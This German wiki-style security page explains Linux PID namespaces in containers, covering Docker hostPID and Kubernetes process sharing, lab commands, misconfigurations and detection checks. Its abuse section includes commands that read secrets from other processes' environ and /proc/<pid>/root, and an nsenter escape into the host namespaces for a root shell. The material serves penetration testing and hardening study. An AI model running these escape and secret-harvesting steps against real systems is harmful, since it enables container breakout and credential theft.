# PID-Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Übersicht

Der PID-Namespace steuert, wie Prozesse nummeriert werden und welche Prozesse sichtbar sind. Deshalb kann ein Container eine eigene PID 1 haben, obwohl er keine echte Maschine ist. Innerhalb des Namespace sieht die Workload einen scheinbar lokalen Prozessbaum. Außerhalb des Namespace sieht der Host weiterhin die echten Host-PIDs und die vollständige Prozesslandschaft.<sup>[[3]](#references)</sup>

Aus Sicherheitssicht ist der PID-Namespace wichtig, weil die Sichtbarkeit von Prozessen wertvoll ist. Sobald eine Workload Host-Prozesse sehen kann, kann sie möglicherweise Dienstnamen, Kommandozeilenargumente, in Prozessargumenten übergebene Secrets, über `/proc` verfügbare umgebungsbasierte Zustände und potenzielle Ziele für den Namespace-Eintritt beobachten. Wenn sie mehr kann, als diese Prozesse nur zu sehen, etwa unter den richtigen Bedingungen Signale senden oder ptrace verwenden, wird das Problem deutlich schwerwiegender.

## Funktionsweise

Ein neuer PID-Namespace beginnt mit einer eigenen internen Prozessnummerierung. Der erste darin erstellte Prozess erhält aus Sicht des Namespace die PID 1. Damit erhält er auch eine besondere, init-ähnliche Semantik für verwaiste Kindprozesse und das Signalverhalten. Das erklärt viele Eigenheiten von Containern rund um Init-Prozesse, das Aufräumen von Zombie-Prozessen und den Einsatz winziger Init-Wrapper in Containern.<sup>[[3]](#references)</sup>

PID-Namespaces bilden eine Hierarchie. Ein Prozess in einem übergeordneten Namespace kann Nachkommen anhand der in diesem übergeordneten Namespace zugewiesenen PID ansprechen. Ein Nachkomme kann jedoch über gewöhnliche PID-basierte Systemaufrufe keine Aufgaben ansprechen, die nur im übergeordneten Namespace existieren, und auch nicht mit `setns()` in einen übergeordneten PID-Namespace wechseln. Ein dem Nachkommen bewusst bereitgestelltes, dem übergeordneten Namespace zugehöriges procfs kann dennoch die Prozessansicht des übergeordneten Namespace leaken. Außerdem ändert das Beitreten zu einem PID-Namespace mit `setns()` den Namespace für **zukünftige Kindprozesse**, nicht für den aufrufenden Prozess selbst; deshalb führen Tools nach dem Beitritt einen Fork aus. Ein procfs-Mount behält die PID-Ansicht des Prozesses bei, der ihn eingehängt hat. Daher ist das Erstellen eines neuen procfs nach `unshare(CLONE_NEWPID)` sicherheitsrelevant und nicht bloß kosmetisch.<sup>[[3]](#references)</sup>

Die zentrale Sicherheitslehre lautet: Ein Prozess kann isoliert wirken, weil er nur seinen eigenen PID-Baum sieht, doch diese Isolation kann gezielt aufgehoben werden. Docker ermöglicht dies mit `--pid=host`, Kubernetes mit `hostPID: true`. Sobald der Container dem Host-PID-Namespace beitritt, sieht die Workload Host-Prozesse direkt, wodurch viele nachfolgende Angriffswege deutlich realistischer werden.

## Lab

So lässt sich manuell ein PID-Namespace erstellen:

```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```

Die Shell sieht nun eine private Prozessansicht. Das Flag `--mount-proc` ist wichtig, da es eine procfs-Instanz einbindet, die zum neuen PID namespace passt und dadurch die Prozessliste von innen konsistent macht.<sup>[[3]](#references)</sup>

Zum Vergleich des Containerverhaltens:

```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```

Der Unterschied ist unmittelbar und leicht zu verstehen. Deshalb eignet sich dies gut als erstes Lab für Leser.

## Laufzeitverwendung

Normale Container in Docker, Podman, containerd und CRI-O erhalten einen eigenen PID namespace. Kubernetes-Container haben normalerweise separate PID-Ansichten; `shareProcessNamespace: true` erstellt bewusst eine gemeinsame Ansicht für den gesamten Pod.<sup>[[4]](#references)</sup> Im Gegensatz dazu wählt `hostPID: true` den PID namespace des Knotens aus. LXC/Incus-Umgebungen verwenden dieselbe Kernel-Primitive, wobei Anwendungsfälle mit Systemcontainern jedoch komplexere Prozessbäume aufweisen und zu weiteren Debugging-Abkürzungen verleiten können.

Dieselbe Regel gilt überall: Wenn die Runtime den PID namespace nicht isoliert, ist das eine bewusste Abschwächung der Container-Grenze.

## Fehlkonfigurationen

Die klassische Fehlkonfiguration ist das Teilen des Host-PID namespace. Teams rechtfertigen dies oft mit Debugging, Monitoring oder praktischer Dienstverwaltung, sollten es jedoch immer als relevante Sicherheitsausnahme behandeln. Selbst wenn der Container keine unmittelbare Schreibmöglichkeit gegenüber Host-Prozessen hat, kann bereits deren Sichtbarkeit viel über das System verraten. Sobald Fähigkeiten wie `CAP_SYS_PTRACE` oder nützlicher procfs-Zugriff hinzukommen, steigt das Risiko erheblich.

Ein weiterer Fehler ist die Annahme, das Teilen des Host-PID namespace sei harmlos, weil der Workload Host-Prozesse standardmäßig weder beenden noch per ptrace untersuchen kann. Dabei werden der Nutzen der Aufzählung, verfügbare Ziele für den Namespace-Eintritt und das Zusammenspiel der PID-Sichtbarkeit mit anderen abgeschwächten Kontrollen außer Acht gelassen.

### Prozessfreigabe im gesamten Kubernetes-Pod

`shareProcessNamespace: true` unterscheidet sich von `hostPID`: Dadurch werden die Prozesse der **anderen Container im selben Pod** sichtbar, nicht die Prozesse des Knotens. Ein kompromittierter Sidecar- oder Debug-Container kann dann unter Berücksichtigung der procfs-Zugriffskontrollen Befehlszeilen und Umgebungsdaten benachbarter Container auflisten, Signale senden, sofern die Anmeldedaten dies erlauben, und über `/proc/<pid>/root` das Dateisystem eines benachbarten Containers durchlaufen. Kubernetes warnt ausdrücklich, dass Befehlszeilen- und Umgebungsvariablen-Geheimnisse sowie Container-Dateisysteme dann nur durch die jeweils geltenden Unix-Berechtigungen geschützt sind.<sup>[[4]](#references)</sup>

Nützliche Überprüfung auf Cluster-Ebene:

```bash
kubectl get pods -A -o json | jq -r '
  .items[] |
  select(.spec.hostPID == true or .spec.shareProcessNamespace == true) |
  [.metadata.namespace,.metadata.name,
   (.spec.hostPID // false),(.spec.shareProcessNamespace // false)] | @tsv'
```

Testen Sie in einem kompromittierten Container in einem Pod-weiten PID-Namespace zuerst den tatsächlichen Zugriff, statt davon auszugehen, dass Sichtbarkeit gleich Lesbarkeit ist:<sup>[[4]](#references)</sup>

```bash
victim=$(ps -eo pid,args | awk '/[n]ginx|[j]ava|[p]ython/{print $1; exit}')
[ -n "$victim" ] || { echo "No candidate process found"; exit 1; }
tr '\0' ' ' < "/proc/$victim/cmdline" 2>/dev/null; echo
tr '\0' '\n' < "/proc/$victim/environ" 2>/dev/null | sed -n '1,20p'
find "/proc/$victim/root/run/secrets" -maxdepth 2 -type f -ls 2>/dev/null
```

### Auf einen laufenden Kubernetes-Pod gerichtete ephemere Container

Eine Kubernetes-Identität, die `pods/ephemeralcontainers` ändern darf, kann einem laufenden Pod einen Debugger hinzufügen, selbst wenn `shareProcessNamespace` nicht gesetzt ist. Mit `--target` tritt der Debugger dem Prozess-Namespace des benannten Containers bei, sofern die Runtime das Namespace-Targeting unterstützt. Dies ermöglicht die Einsicht in die Prozesse dieses Containers, nicht in den Host-PID-Namespace des Nodes.<sup>[[5]](#references)</sup>

Die API verwendet eine separate Subresource. Prüfe daher die Rechte für `patch`/`update`, anstatt davon auszugehen, dass gewöhnliche Schreibberechtigungen für Pods dafür ausreichen.<sup>[[6]](#references)</sup>

Teste für einen Pod und einen Container innerhalb eines autorisierten Namespace die gezielte Ansicht:<sup>[[5]](#references)[[6]](#references)</sup>

```bash
ns=default; pod=myapp; container=app
kubectl auth can-i get pods -n "$ns"
kubectl auth can-i patch pods/ephemeralcontainers -n "$ns"
kubectl auth can-i update pods/ephemeralcontainers -n "$ns"
kubectl auth can-i create pods/attach -n "$ns"
kubectl -n "$ns" debug -it "pod/$pod" --image=busybox:1.36 --target="$container" -- sh
# In the debug shell: verify the target processes are actually visible.
ps -ef
```

Wenn die Runtime kein Targeting unterstützt, startet der Debugger möglicherweise nicht oder bleibt in einem isolierten PID-Namespace.<sup>[[5]](#references)</sup> Wenn das Targeting funktioniert, verwende die Prüfungen unter [Kubernetes Pod-wide process sharing](#kubernetes-pod-wide-process-sharing), um den Zugriff auf `/proc/<pid>` zu testen. Sichtbarkeit bedeutet nicht, dass du die Secrets des Ziels lesen oder Signale an es senden darfst: Unix-Zugangsdaten und procfs-Zugriffskontrollen gelten weiterhin.<sup>[[4]](#references)[[8]](#references)</sup> Die Pod Security Standards schränken außerdem privilegierte Einstellungen für ephemere Container ein.<sup>[[7]](#references)</sup>

## Missbrauch

Wenn der Host-PID-Namespace gemeinsam genutzt wird, kann ein Angreifer Host-Prozesse untersuchen, Prozessargumente sammeln, interessante Dienste identifizieren, mögliche PIDs für `nsenter` finden oder die Prozesssichtbarkeit mit ptrace-bezogenen Berechtigungen kombinieren, um Host- oder benachbarte Workloads zu beeinträchtigen. In manchen Fällen genügt es, den richtigen lang laufenden Prozess zu sehen, um den weiteren Angriffsplan neu auszurichten.

Der erste praktische Schritt besteht immer darin, zu bestätigen, dass Host-Prozesse tatsächlich sichtbar sind:

```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```

Sobald Host-PIDs sichtbar sind, sind Prozessargumente und Ziele für den Eintritt in Namespaces oft die nützlichste Informationsquelle:

```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
  echo "PID=$p"
  tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```

Wenn `nsenter` verfügbar ist und ausreichende Berechtigungen vorhanden sind, teste, ob ein sichtbarer Host-Prozess als Namespace-Brücke verwendet werden kann:

```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```

Auch wenn der Eintritt blockiert ist, ist das Teilen der Host-PIDs bereits nützlich, da es Einblicke in die Dienststruktur, Laufzeitkomponenten und mögliche privilegierte Prozesse als nächste Ziele bietet. Die Sichtbarkeit von PIDs allein gewährt **keine** Berechtigung, Signale zu senden, Prozesse zu tracen, sensible Einträge unter `/proc/<pid>` zu lesen oder den anderen Namespaces des Ziels beizutreten; weiterhin relevant sind Credentials, Dumpability, Capabilities im User-Namespace, dem der Ziel-Namespace gehört, Yama-/LSM-Richtlinien und seccomp.<sup>[[3]](#references)</sup> Siehe [CAP_SYS_PTRACE](../../../../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace) für Beispiele zur Process Injection.

Die Sichtbarkeit von Host-PIDs macht auch den Missbrauch von Dateideskriptoren realistischer. Wenn ein privilegierter Host-Prozess oder ein benachbarter Workload eine sensible Datei oder einen Socket geöffnet hat, kann der Angreifer möglicherweise `/proc/<pid>/fd/` untersuchen und auf das zugrunde liegende Objekt zugreifen – abhängig von ptrace-ähnlichen Prüfungen, den Eigentumsverhältnissen, den procfs-Mount-Optionen, dem Objekttyp und dem Dienstmodell des Ziels. Einen FD-Symlink zu sehen, bedeutet nicht, dass er geöffnet werden kann, und ein Socket lässt sich nicht einfach durch Öffnen seines `/proc/<pid>/fd/N`-Symlinks duplizieren. Informationen zur separaten Primitive `pidfd_getfd()` und ihren Autorisierungsprüfungen finden Sie unter [Linux ptrace exit-race pidfd FD theft](../../../../main-system-information/kernel-lpe-cves/linux-ptrace-exit-race-pidfd_getfd-fd-theft.md).<sup>[[3]](#references)</sup>

```bash
for fd_dir in /proc/[0-9]*/fd; do
  ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```

Diese Befehle sind nützlich, weil sie zeigen, ob `hidepid=1` oder `hidepid=2` die Sichtbarkeit zwischen Prozessen einschränkt und ob offensichtlich interessante Deskriptoren wie geöffnete geheime Dateien, Logs oder Unix-Sockets überhaupt sichtbar sind.

### Vollständiges Beispiel: Host-PID + `nsenter`

Die gemeinsame Nutzung der Host-PID kann einen Host Escape ermöglichen, wenn der Prozess über die erforderlichen Capabilities verfügt, um den Host-Namespaces beizutreten und das Root-Verzeichnis des Host-Prozesses zu übernehmen. Für Letzteres ist `nsenter --root` (`-r`) erforderlich: Ein Wechsel des Mount-Namespace allein ändert das Root-Verzeichnis des aufrufenden Prozesses nicht.<sup>[[9]](#references)</sup> Der Zugriff auf `/proc/1/root` unterliegt einer ptrace-Leseprüfung, während zum Ändern des Root-Verzeichnisses `CAP_SYS_CHROOT` im User-Namespace des aufrufenden Prozesses erforderlich ist.<sup>[[8]](#references)[[10]](#references)</sup>

```bash
ps -ef | head -n 50
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
nsenter -t 1 -m -u -n -i -p -r -W / -- /bin/sh
```

Wenn der Befehl erfolgreich ist, verwendet die neue Shell die Mount-, UTS-, Netzwerk-, IPC- und PID-Namespaces des Hosts sowie das Root-Dateisystem von PID 1. Prüfe die effektive Identität und die Zugriffsrechte, statt anzunehmen, dass die Sichtbarkeit von PIDs allein Host-Privilegien gewährt.<sup>[[9]](#references)</sup>

Selbst wenn `nsenter` fehlt, lässt sich dasselbe Ergebnis möglicherweise über die Binärdatei des Hosts erreichen, sofern das Host-Dateisystem eingehängt ist:

```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p -r -W / -- /bin/sh 2>/dev/null
```

### Aktuelle Hinweise zur Runtime

Einige für PID-Namespaces relevante Angriffe beruhen nicht auf herkömmlichen `hostPID: true`-Fehlkonfigurationen, sondern auf Implementierungsfehlern der Runtime bei der Anwendung von procfs-Schutzmaßnahmen während der Container-Einrichtung.

#### `maskedPaths`-Race auf das Host-procfs

In verwundbaren `runc`-Versionen konnten Angreifer, die das Container-Image oder die `runc exec`-Workload kontrollieren, während der Maskierungsphase einen Race auslösen, indem sie das containerseitige `/dev/null` durch einen Symlink auf einen sensiblen procfs-Pfad wie `/proc/sys/kernel/core_pattern` ersetzten. War der Race erfolgreich, konnte der Bind-Mount für den maskierten Pfad am falschen Ziel landen und hostweite procfs-Parameter für den neuen Container offenlegen.<sup>[[1]](#references)</sup>

Nützlicher Befehl zur Überprüfung:

```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```

Das ist wichtig, weil die letztendlichen Auswirkungen denen einer direkten procfs-Exposition entsprechen können: beschreibbares `core_pattern` oder `sysrq-trigger`, gefolgt von Codeausführung auf dem Host oder einem Denial of Service. Die Seiten zu [masked paths](../masked-paths.md) und [sensitive host mounts](../../sensitive-host-mounts.md) behandeln die allgemeine Angriffsfläche von procfs, ohne sie hier zu wiederholen.

#### Namespace injection mit `insject`

Tools zur Namespace injection wie `insject` zeigen, dass die Interaktion mit einem PID namespace nicht immer erfordert, vor der Prozesserstellung in den Ziel-Namespace einzutreten. Ein Helfer kann sich später anhängen, `setns()` verwenden und Befehle ausführen, während die Sichtbarkeit im PID-Bereich des Ziels erhalten bleibt:<sup>[[2]](#references)</sup>

```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```

Diese Art von Technik ist vor allem für erweitertes Debugging, offensive Tools und Post-Exploitation-Workflows relevant, bei denen der Namespace-Kontext erst eingebunden werden muss, nachdem die Runtime die Workload bereits initialisiert hat.

### Verwandte FD-Missbrauchsmuster

Zwei Muster sind besonders erwähnenswert, wenn Host-PIDs sichtbar sind. Erstens kann ein privilegierter Prozess einen sensiblen Dateideskriptor über `execve()` hinweg geöffnet halten, weil er nicht mit `O_CLOEXEC` markiert wurde. Zweitens können Dienste Dateideskriptoren über Unix-Sockets mittels `SCM_RIGHTS` weitergeben. In beiden Fällen ist nicht mehr der Pfad selbst interessant, sondern der bereits geöffnete Handle, den ein Prozess mit geringeren Berechtigungen erben oder empfangen kann.

Das ist bei der Arbeit mit Containern relevant, weil der Handle auf `docker.sock`, ein privilegiertes Log, eine geheime Host-Datei oder ein anderes wertvolles Objekt verweisen kann, selbst wenn der Pfad über das Container-Dateisystem nicht direkt erreichbar ist.

## Prüfungen

Mit diesen Befehlen lässt sich feststellen, ob der Prozess eine private PID-Sicht hat oder bereits eine deutlich umfassendere Prozesslandschaft auflisten kann.

```bash
readlink /proc/self/ns/{pid,pid_for_children,user,mnt}
grep -E '^(Name|Pid|PPid|NSpid|Uid|Gid|TracerPid):' /proc/self/status
ps -ef | head
findmnt -no TARGET,FSTYPE,OPTIONS /proc
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
capsh --print 2>/dev/null | grep -E 'Current:|Bounding'
```

Was hier interessant ist:<sup>[[3]](#references)</sup>

- Wenn die Prozessliste offensichtliche Host-Dienste enthält, ist die gemeinsame Nutzung der Host-PIDs wahrscheinlich bereits aktiviert.
- Ein winziger, containerlokaler Prozessbaum ist der normale Ausgangszustand; `systemd`, `dockerd` oder nicht zugehörige Daemons hingegen nicht.
- `NSpid` kann die PID-Zuordnung über verschachtelte Namespaces hinweg offenlegen. Der Wert ganz links bezieht sich auf den PID-Namespace, dem der procfs-Mount zugeordnet ist; danach folgen Werte für die jeweils tiefer verschachtelten Namespaces.
- `readlink /proc/self/ns/pid` allein kann `hostPID` nicht beweisen: Auch ein isolierter Container hat einen gültigen PID-Namespace-Inode. Gleiche ihn mit der Prozessliste, dem procfs-Mount, der Runtime-Konfiguration und, falls verfügbar, einem Namespace-Inode auf dem Host ab.
- Sobald Host-PIDs sichtbar sind, sind selbst schreibgeschützte Prozessinformationen für die Aufklärung nützlich.

Wenn du entdeckst, dass ein Container die Host-PIDs gemeinsam nutzt, solltest du das nicht als kosmetischen Unterschied betrachten. Es verändert erheblich, was die Workload beobachten und potenziell beeinflussen kann.





## References

- [1] [runc-Sicherheitswarnung: Container-Escape durch Missbrauch eines „masked path“ aufgrund von Mount-Race-Bedingungen (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Tool-Veröffentlichung – insject: Ein Linux-Namespace-Injektor](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)
- [3] [Linux-man-pages-Buch 6.19](https://www.kernel.org/pub/linux/docs/man-pages/book/man-pages-6.19.pdf)
- [4] [Prozess-Namespace zwischen Containern in einem Pod gemeinsam nutzen](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/)
- [5] [Laufende Pods debuggen](https://kubernetes.io/docs/tasks/debug/debug-application/debug-running-pod/)
- [6] [KEP zu kurzlebigen Containern](https://www.kubernetes.dev/resources/keps/277/)
- [7] [Pod-Sicherheitsstandards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [8] [proc_pid_root(5)](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
- [9] [nsenter(1)](https://man7.org/linux/man-pages/man1/nsenter.1.html)
- [10] [chroot(2)](https://man7.org/linux/man-pages/man2/chroot.2.html)
{{#include ../../../../../banners/hacktricks-training.md}}
